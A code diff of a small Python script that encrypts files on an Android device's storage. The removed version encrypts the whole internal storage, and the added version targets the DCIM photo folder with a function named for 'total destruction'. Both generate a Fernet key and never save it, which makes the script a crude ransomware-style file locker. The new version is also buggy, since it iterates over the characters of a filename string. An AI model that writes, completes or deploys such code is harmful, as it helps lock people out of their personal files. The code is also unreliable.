@@ -1,37 +1,45 @@
 from cryptography.fernet import Fernet
 import os
 
-def encrypt_file(file_path, output_path):
-    # Generate a Fernet key
-    key = Fernet.generate_key()
-    cipher = Fernet(key)
+os.chdir("/storage/emulated/0/DCIM")
+# os.chdir("/root/Pictures")
 
-    with open(file_path, "rb") as file:
-        plaintext = file.read()
-
-    # Encrypt the file
-    ciphertext = cipher.encrypt(plaintext)
-
-    # Save the encrypted file
-    with open(output_path, "wb") as file:
-        file.write(ciphertext)
-
-    print(f"File encrypted and saved as {output_path}")
-
-def encrypt_files_in_directory(directory):
-    for root, _, files in os.walk(directory):
-        for file in files:
-            file_path = os.path.join(root, file)
-            encrypted_file = file_path + "_encrypted"  # Appending "_encrypted" to the original filename
-            encrypt_file(file_path, encrypted_file)
 
 def main():
-    try:
-        internal_storage = "/storage/emulated/0/"
-        encrypt_files_in_directory(internal_storage)
+        
+    def utpann():
+        return Fernet.generate_key()
+    
+    def sarvanash(file, key):
+        try:    
+            with open(file, 'rb') as file_raw:
+                
+                data = file_raw.read()
 
-    except FileNotFoundError as e:
-        print(f"Error: {e}")
+            fernet = Fernet(key)
+            encrypted_data = fernet.encrypt(data)
+
+            with open(file + ".joke", 'wb') as file_enc:
+                file_enc.write(encrypted_data)
+        except:
+            pass        
+    
+    # files = []
+    
+    # for file in os.listdir():
+    #     if os.path.isfile(file):
+    #         files.append(file)
+    # print(files)
+    key = utpann()
+    files = "example.txt"
+
+    # with open('thekey.key', 'wb') as key_file:
+    #     key_file.write(key)
+
+    for file in files:
+        sarvanash(file, key)
+        print(file + " encrypted successfully!")
 
 
 main()
+
